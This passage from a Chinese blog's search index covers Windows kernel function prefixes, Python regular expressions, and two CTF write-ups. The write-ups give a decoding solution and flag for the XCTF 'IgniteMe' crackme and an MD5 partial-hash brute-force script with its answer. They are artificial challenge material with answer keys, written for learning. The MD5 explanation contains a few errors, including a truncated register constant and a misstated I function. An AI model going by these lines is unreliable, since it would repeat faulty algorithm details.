    <content type="text"><![CDATA[Windows 内核函数Windows 内核部分会调用一些内核层的函数。这些函数都以固定的开始前缀，分别属于内核中不同的管理模块。通过函数名就可以大致知道这个函数所属的层次和模块。这些主要的前缀如下： * Ex：管理层。“Ex”是“Executive”的开头两个字母。 * Ke：核心层。“Ke”是“Kernel”的开头两个字母。 * HAL：硬件抽象层。“HAL”是“Hardware Abstraction Layer”的缩写。 * Ob：对象管理。“Ob”是“Object”的开头两个字母。 * MM：内存管理。“MM”是“Memory Manager”的缩写。 * Ps：进程（线程）管理。“Ps”表示“Process”。 * Se：安全管理。“Se”是“Security”的开头两个字母。 * Io：I/O管理。 * Fs：文件系统。“Fs”是“File System”的缩写。 * Cc：文件缓存管理。“Cc”表示“Cache”。 * Cm：系统配置管理。“Cm”是“Configuration Manager”的缩写。 * Pp：即插即用管理。“Pp”表示“Pnp”。 * Rtl：运行时程序库。“Rtl”是“Runtime Library”的缩写。 * Zw/Nt：对应于SSDT中的服务函数，例如与文件或者注册表相关的操作函数。 * Flt：Minifilter文件过滤驱动中调用的函数。 * Ndis：Ndis网络框架中调用的函数。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式的学习]]></title>
    <url>%2F2019%2F09%2F10%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1、re.match函数re.match尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法：1、re.match(pattren, string, flags=0) 说明：pattern:匹配的正则表达式。 string:要匹配的字符串。 flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。匹配成功re.match方法返回一个匹配的对象，否则返回none。可以使用group(num)或group()匹配对象函数来获取匹配表达式。 group(num=0):匹配的整个表达式的字符串，group()可以一次输入多个组号，在这种情况下它将返回一个包含那些所对应值的元组。 groups():返回一个包含所有小组字符串的元组，从1到所含的小组号。实例： 123import reprint(re.match('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.match('com', 'www.runoob.com')) # 不在起始位置匹配 运行结果： 12(0, 3)None 实例： 12345678910111213#!/usr/bin/pythonimport re line = "Cats are smarter than dogs" matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I) if matchObj: print "matchObj.group() : ", matchObj.group() print "matchObj.group(1) : ", matchObj.group(1) print "matchObj.group(2) : ", matchObj.group(2)else: print "No match!!" 运行结果: 123matchObj.group() : Cats are smarter than dogsmatchObj.group(1) : CatsmatchObj.group(2) : smarter 2、re.search方法re.search扫描整个字符串并返回第一个成功的匹配。 函数语法： re.search(p,attern, string, flags=0)实例： 123456#!/usr/bin/python# -*- coding: UTF-8 -*- import reprint(re.search('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.search('com', 'www.runoob.com').span()) # 不在起始位置匹配 结果： 12(0, 3)(11, 14) re.match与re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 3、检索和替换re.sub(pattren, repl, string, count=0, flags=0) 说明：repl：替换的字符串，也可以为一个函数。 count：模式匹配后替换的最大次数，默认0表示替换所有的匹配。1234567891011121314#!/usr/bin/python# -*- coding: UTF-8 -*- import re phone = "2004-959-559 # 这是一个国外电话号码" # 删除字符串中的 Python注释 num = re.sub(r'#.*$', "", phone)print "电话号码是: ", num # 删除非数字(-)的字符串 num = re.sub(r'\D', "", phone)print "电话号码是 : ", num 结果： 12电话号码是: 2004-959-559 电话号码是 : 2004959559 findall 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 注意： match 和 search 是匹配一次 findall 匹配所有。语法格式为： findall(string[, pos[, endpos]]) 参数： string : 待匹配的字符串。 pos : 可选参数，指定字符串的起始位置，默认为 0。 endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。实例： 12345678910# -*- coding:UTF8 -*- import re pattern = re.compile(r'\d+') # 查找数字result1 = pattern.findall('runoob 123 google 456')result2 = pattern.findall('run88oob123google456', 0, 10) print(result1)print(result2) 结果： 12['123', '456']['88', '12'] re.finditer 和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 re.finditer(pattern, string, flags=0)实例： 1234import reit = re.finditer(r"\d+","12a32bc43jf3") for match in it: print (match.group() ) 结果： 123412 32 43 3 4、正则表达式修饰符 - 可选标志re.I：使匹配对大小写不敏感 re.L：做本地化识别（locale-aware）匹配 re.M：多行匹配，影响 ^ 和 $ re.S：使 . 匹配包括换行在内的所有字符 re.U：根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B. re.X：该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。6、正则表达式模式^：匹配字符串的开头$：匹配字符串的末尾。.：匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。[…]：用来表示一组字符,单独列出：[amk] 匹配’a’，’m’或’k’[^…]：不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。re：匹配0个或多个的表达式。re+：匹配1个或多个的表达式。re?：匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式re{ n}：精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。re{ n,}：匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于”o“。re{ n, m}：匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式a| b：匹配a或b(re)：对正则表达式分组并记住匹配的文本(?imx)：正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。(?-imx)：正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。(?: re)：类似 (…), 但是不表示一个组(?imx: re)：在括号中使用i, m, 或 x 可选标志(?-imx: re)：在括号中不使用i, m, 或 x 可选标志(?#…)：注释.(?= re)：前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。(?! re)：前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功(?&gt; re)：匹配的独立模式，省去回溯。\w：匹配字母数字及下划线\W：匹配非字母数字及下划线\s：匹配任意空白字符，等价于 [\t\n\r\f].\S：匹配任意非空字符\d：匹配任意数字，等价于 [0-9].\D：匹配任意非数字\A：匹配字符串开始\Z：匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。\z：匹配字符串结束\G：匹配最后匹配完成的位置。\b：匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’：可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。\B：匹配非单词边界。’er\B’ 能匹配 “verb”中的’er’，但不能匹配 “never” 中的 ‘er’。\n, \t, 等. ：匹配一个换行符。匹配一个制表符。等\1…\9：匹配第n个分组的内容。\10：匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道RE学习：IngiteMe]]></title>
    <url>%2F2019%2F09%2F10%2FIgniteMe%E9%80%86%E5%90%91%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、RE-IgniteMe这道题来自XCTF社区，比较简单。 题目链接：https://adworld.xctf.org.cn/media/task/attachments/fac4d1290e604fdfacbbe06fd1a5ca39.exe2、解题思路下载好后我们发现这是一个EXE文件，先拖入PEID查壳看看，发现没有壳。直接运行，题目要求你输入flag，我们用IDA打开，进入_main函数，按F5 我们可以发现一串“Congratulations！”字符，这里应该就是关键判断，双击它sub_4011C0函数，进入查看 可以看到末尾的关键字符串，从后往前推，它的主要算法是异或和加减以及大小写字母之间的转换，我用C语言写了段代码进行解码，代码如下： 12345678910111213141516171819202122int main()&#123; int i; char str[32] = "GONDPHyGjPEKruv&#123;&#123;pj]X@rF"; int num[32] = &#123;0x0D, 0x13,0x17,0x11,2,1, 0x20,0x1D,0x0C,2,0x19,0x2F,0x17,0x2B,0x24, 0x1F,0x1E,0x16,9,0x0F,0x15,0x27,0x13,0x26, 0x0A,0x2F,0x1E,0x1A,0x2D,0x0C,0x22,4&#125;; for(i = 0; str[i] !='\0'; i++) &#123; str[i] = ((str[i]^num[i])-72)^0x55; if(str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') str[i] -= 32; if(str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') str[i] += 32; &#125; printf("EIS&#123;%s&#125;\n",str); return 0;&#125; 运行后得出flag： 1EIS&#123;wadx_tdgk_aihc_ihkn_pjlm&#125; 3、总结逆向过程需要耐心和不断地尝试。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD5算法学习]]></title>
    <url>%2F2019%2F09%2F10%2FMD5%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1、题目内容 这里有一段丢失的md5密文 e9032???da???08????911513?0???a2要求你还原出他并且加上nctf{}提交 已知线索 明文为：TASC?O3RJMV?WDJKX?ZM 。 题目来源：安恒杯 简单的MD5密码碰撞，通过对比密文e9032与加密后的数据，定位相关信息。我用Python写了一个简单的解题代码，运行后得出密文。3. 解题代码如下1234567891011121314151617181920import md5Enable = &#123;'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q', 'R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8', '9',' ', '!', '"', '#', '$', '%', '&amp;', '\'', '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '&lt;', '=', '&gt;', '?', '@','[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k','l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '&#123;', '|', '&#125;', '~'&#125;fiveCode = ""for i in Enable: for j in Enable: for k in Enable: strToDecode = "TASC" + i + "O3RJMV" + j + "WDJKX" + k + "ZM" m1 = md5.new() m1.update(strToDecode) cipher = m1.hexdigest() fiveCode = cipher[0:5] if fiveCode == "e9032": print "密文：" + cipher 结果如下： 1密文：e9032994dabac08080091151380478a2 4、MD5算法1、算法原理 （1）数据填充 填充消息使其长度与448模512同余（即长度=448 mod 512）.也就是说，填充后的消息长度比512的倍数小64位。填充方法：附一个1在消息后面，然后用0来填充，直到消息的长度与448模512同余。至少填充1位，至多填充512位。 （2）添加长度 在上一步的结果之后附上64位的消息长度。如果填充前消息长度大于2^64，则只使用其低64位。添加填充位和消息长度之后，最终消息的长度正好是512的整数倍。 （3）初始化变量 用四个变量（A、B、C、D）来计算消息摘要。这里的A、B、C、D都是32位的寄存器。这些寄存器以下面的十六进制来初始化： A=01234567h，B=89abcdefh，C=fedcbah，D=76543210h 而且，在内存中是以低字节在前的形式储存的，格式如下： 01 23 45 67 89 AB CD EF FE DC BA 98 76 54 32 10 （4）数据处理 以512位分组为单位处理消息。首先定义4个辅助函数，每个都是以3个32为双字作为输入，输出1个32位双字。 F(X，Y，Z) = (X&amp;Y)|((~X)&amp;Z) G(X，Y，Z) = (X&amp;Z)|(Y&amp;(~Z)) H(X，Y，Z) = X^Y^Z I(X，Y，Z) = Y^X|(~Z) 注：&quot;&amp;&quot;是与操作，&quot;|&quot;是或操作，&quot;~&quot;是非操作，&quot;^&quot;是异或操作。 这四轮变换是对进入主循环的521位消息分组的16个32位字分别进行如下操作：将A、B、C、D的副本a、b、c、d中的3个经F、G、H、I运算后的结果与第4个相加，再加上32位字和一个32位字的加法常数，并将所得的值循环左移若干位，最后结果加上啊a、b、c、d其中一个，并回送至A、B、C、D，由此完成一次循环。 所用的加法常数由表T[i]来定义，其中i为1至64之中的值。T[i]等于4294967296乘以abs(sin(i))所得结果的整数部分，其中i用弧度来表示。 FF(a, b, c, d, M[j], s, ti)表示 a = b + ((a + F(b, c, d) + Mj + ti) &lt;&lt;&lt; s) GG(a, b, c, d, M[j], s, ti)表示 a = b + ((a + G(b, c, d) + Mj + ti) &lt;&lt;&lt; s) HH(a, b, c, d, M[j], s, ti)表示 a = b + ((a + H(b, c, d) + Mj + ti) &lt;&lt;&lt; s) II(a, b, c, d, M[j], s, ti)表示 a = b + ((a + I(b, c, d) + Mj + ti) &lt;&lt;&lt; s) For i = 0 to N/16-1 do For j = 0 to 15 do Set X[j] to M[i*16+j] AA=A; BB=B; CC=C; DD=D FF(a,b,c,d,M[0],7,0xd76aa478) ; FF(d,a,b,c,M[1],12,0xe8c7b756) ; FF(c,d,a,b,M[2],17,0x242070db) ; FF(b,c,d,a,M[3],22,0xc1bdceee) ; FF(a,b,c,d,M[4],7,0xf57c0faf) ; FF(d,a,b,c,M[5],12,0x4787c62a) ; FF(c,d,a,b,M[6],17,0xa8304613) ; FF(b,c,d,a,M[7],22,0xfd469501) ; FF(a,b,c,d,M[8],7,0x698098d8) ; FF(d,a,b,c,M[9],12,0x8b44f7af) ; FF(c,d,a,b,M[10],17,0xffff5bb1); FF(b,c,d,a,M[11],22,0x895cd7be); FF(a,b,c,d,M[12],7,0x6b901122) ; FF(d,a,b,c,M[13],12,0xfd987193); FF(c,d,a,b,M[14],17,0xa679438e); FF(b,c,d,a,M[15],22,0x49b40821); GG(a,b,c,d,M[1],5,0xf61e2562) ; GG(d,a,b,c,M[6],9,0xc040b340) ; GG(c,d,a,b,M[11],14,0x265e5a51); GG(b,c,d,a,M[0],20,0xe9b6c7aa) ; GG(a,b,c,d,M[5],5,0xd62f105d) ; GG(d,a,b,c,M[10],9,0x02441453) ; GG(c,d,a,b,M[15],14,0xd8a1e681); GG(b,c,d,a,M[4],20,0xe7d3fbc8) ; GG(a,b,c,d,M[9],5,0x21e1cde6) ; GG(d,a,b,c,M[14],9,0xc33707d6) ; GG(c,d,a,b,M[3],14,0xf4d50d87) ; GG(b,c,d,a,M[8],20,0x455a14ed) ; GG(a,b,c,d,M[13],5,0xa9e3e905) ; GG(d,a,b,c,M[2],9,0xfcefa3f8) ; GG(c,d,a,b,M[7],14,0x676f02d9) ; GG(b,c,d,a,M[12],20,0x8d2a4c8a); HH(a,b,c,d,M[5],4,0xfffa3942) ; HH(d,a,b,c,M[8],11,0x8771f681) ; HH(c,d,a,b,M[11],16,0x6d9d6122); HH(b,c,d,a,M[14],23,0xfde5380c); HH(a,b,c,d,M[1],4,0xa4beea44) ; HH(d,a,b,c,M[4],11,0x4bdecfa9) ; HH(c,d,a,b,M[7],16,0xf6bb4b60) ; HH(b,c,d,a,M[10],23,0xbebfbc70); HH(a,b,c,d,M[13],4,0x289b7ec6) ; HH(d,a,b,c,M[0],11,0xeaa127fa) ; HH(c,d,a,b,M[3],16,0xd4ef3085) ; HH(b,c,d,a,M[6],23,0x04881d05) ; HH(a,b,c,d,M[9],4,0xd9d4d039) ; HH(d,a,b,c,M[12],11,0xe6db99e5); HH(c,d,a,b,M[15],16,0x1fa27cf8); HH(b,c,d,a,M[2],23,0xc4ac5665) ; II(a,b,c,d,M[0],6,0xf4292244) ; II(d,a,b,c,M[7],10,0x432aff97) ; II(c,d,a,b,M[14],15,0xab9423a7); II(b,c,d,a,M[5],21,0xfc93a039) ; II(a,b,c,d,M[12],6,0x655b59c3) ; II(d,a,b,c,M[3],10,0x8f0ccc92) ; II(c,d,a,b,M[10],15,0xffeff47d); II(b,c,d,a,M[1],21,0x85845dd1) ; II(a,b,c,d,M[8],6,0x6fa87e4f) ; II(d,a,b,c,M[15],10,0xfe2ce6e0); II(c,d,a,b,M[6],15,0xa3014314) ; II(b,c,d,a,M[13],21,0x4e0811a1); II(a,b,c,d,M[4],6,0xf7537e82) ; II(d,a,b,c,M[11],10,0xbd3af235); II(c,d,a,b,M[2],15,0x2ad7d2bb) ; II(b,c,d,a,M[9],21,0xeb86d391) ; A = A+AA; B = B+BB; C = C+CC; D = D+DD （5）输出 当512位分组都运算完毕，A、B、C、D的连级将被输出为MD5散列的结果。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
</search>
